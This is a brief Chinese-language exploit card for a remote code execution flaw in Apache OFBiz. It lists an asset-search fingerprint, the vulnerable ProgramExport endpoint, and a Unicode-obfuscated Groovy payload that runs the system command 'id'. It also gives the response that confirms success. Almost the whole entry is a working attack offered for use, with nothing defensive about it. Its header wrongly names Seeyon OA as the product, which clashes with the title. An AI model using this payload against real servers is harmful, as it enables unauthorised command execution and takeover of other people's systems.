# ApacheOFBiz授权不当致远程代码执行漏洞

致远OA ｜ 命令执行 ｜ —
- **指纹**：`app="Apache_OFBiz"`
- **请求**：`POST /webtools/control/main/ProgramExport HTTP/1.1`

**Payload**
```
groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```
- **响应特征**：200 uid=1000